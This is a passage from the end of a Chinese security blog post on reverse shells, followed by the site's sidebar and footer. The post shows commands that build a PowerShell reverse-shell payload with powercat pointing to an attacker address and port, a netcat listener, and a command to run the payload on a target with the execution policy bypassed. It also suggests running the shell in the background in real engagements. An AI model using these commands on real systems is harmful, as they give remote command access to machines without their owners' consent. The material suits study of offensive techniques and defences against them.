+<p>首先,在本机创建好powershell版的reverse shell的payload,编码处理的还是蛮不错的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Set-ExecutionPolicy Unrestricted</span><br><span class="line">PS C:\&gt; cd .\powercat</span><br><span class="line">PS C:\powercat&gt; Import-Module .\powercat.ps1</span><br><span class="line">PS C:\powercat&gt; powercat -c 192.168.1.128 -p 8080 -e cmd -g &gt;&gt; payload.ps1</span><br><span class="line">C:\&gt;nc -lvp 8080</span><br></pre></td></tr></table></figure></p>
+<p>然后,把payload.ps1丢到目标机器上去执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># powershell –exec bypass –Command &quot;&amp; &#123;Import-Module &apos;C:\payload.ps1&apos;&#125;&quot;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_poewrcat_shell.png" alt="&#39;&#39;"><br></p>
+<p>关于nishang及其它各种powershell工具包中的各种反弹shell的方式,篇幅限制,这里就不一一说了,大家有兴趣可以去关注我的博客[klionsec.github.io],里面很久之前应该写过,可能比较粗糙,大家先将就看吧,后续我会抽空把博客好好整理一下,有点儿乱……</p>
+<p>我知道,基于这种思路,可以衍生出来的方法还有非常非常的多,有兴趣咱们可以一起研究,不可否认的是,虽然只是一个简单的shell,但中间涉及到的东西依然是很值得学习的</p>
+<p>0x07 一一些小结<br>&nbsp;&nbsp;&nbsp;&nbsp;反弹的核心说白点其实就是和目标系统建立socket(如果中间[不管是正向还是反向]端口被防火墙阻断了,那你可能就只能选择复用或者直接走更底层的协议了,还是那句话,只是一个shell而已,方法已经有了,怎么在实战中按照自己的需求改进,可能才是你更需要思考的,另外,我们也看到,反弹的时候,进程会一直处于挂起状态,实际中放到后台跑就好了</p>
+
+      
+    </div>
+    
+    
+    
+
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    klion
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://evil-404.github.io/revese-shell.html" title="你和目标只差一个shell的距离">https://evil-404.github.io/revese-shell.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/reverse-shell/" rel="tag"><i class="fa fa-tag"></i>reverse shell</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/install-py27-on-centos.html" rel="next" title="快速编译安装配置 py2.7 & jdk 1.7">
+                <i class="fa fa-chevron-left"></i> 快速编译安装配置 py2.7 & jdk 1.7
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/hidden-webshell.html" rel="prev" title="放心地种下你的webshell 之 webshell隐藏小记">
+                放心地种下你的webshell 之 webshell隐藏小记 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://ws1.sinaimg.cn/large/baeae4e0ly1fsu7yzju7lj20af0a0wej.jpg"
+                alt="VK" />
+            
+              <p class="site-author-name" itemprop="name">VK</p>
+              <p class="site-description motion-element" itemprop="description">别惹我,我疯起来连自己都黑！</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">157</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">112</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">107</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Hack-with-Github/Awesome-Hacking" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="evil-404@protonmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/HackwithGithub" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-globe"></i>
+                安全资讯
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.freebuf.com" title="FreeBuf" target="_blank">FreeBuf</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.secfree.com" title="指尖安全" target="_blank">指尖安全</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.sec-wiki.com" title="SecWiki" target="_blank">SecWiki</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xz.aliyun.com" title="先知社区" target="_blank">先知社区</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.4hou.com" title="RoarTalk" target="_blank">RoarTalk</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+       
+      
+
+      
+
+<div id="days"></div>
+</script>
+<script language="javascript">
+function show_date_time(){
+window.setTimeout("show_date_time()", 1000);
+BirthDay=new Date("07/01/2018 15:00:00");
+today=new Date();
+timeold=(today.getTime()-BirthDay.getTime());
+sectimeold=timeold/1000
+secondsold=Math.floor(sectimeold);
+msPerDay=24*60*60*1000
+e_daysold=timeold/msPerDay
+daysold=Math.floor(e_daysold);
+e_hrsold=(e_daysold-daysold)*24;
+hrsold=setzero(Math.floor(e_hrsold));
+e_minsold=(e_hrsold-hrsold)*60;
+minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
+seconds=setzero(Math.floor((e_minsold-minsold)*60));
+document.getElementById('days').innerHTML="已运行"+daysold+"天"+hrsold+"小时"+minsold+"分"+seconds+"秒";
+}
+function setzero(i){
+if (i<10)
+{i="0" + i};
+return i;
+}
+show_date_time();
+</script>
+
+  
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">VK</span>
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共293.5k字</span>
+</div>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://evil-404.github.io/">Evil-404</a> 维护</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+
+
+
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v="></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v="></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v="></script>
+<script type="text/javascript" src="/js/src/post-details.js?v="></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v="></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/algolia-instant-search/instantsearch.min.css">
+
+  
+  
+  <script src="/lib/algolia-instant-search/instantsearch.min.js"></script>
+  
+
+  <script src="/js/src/algolia-search.js?v="></script>
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
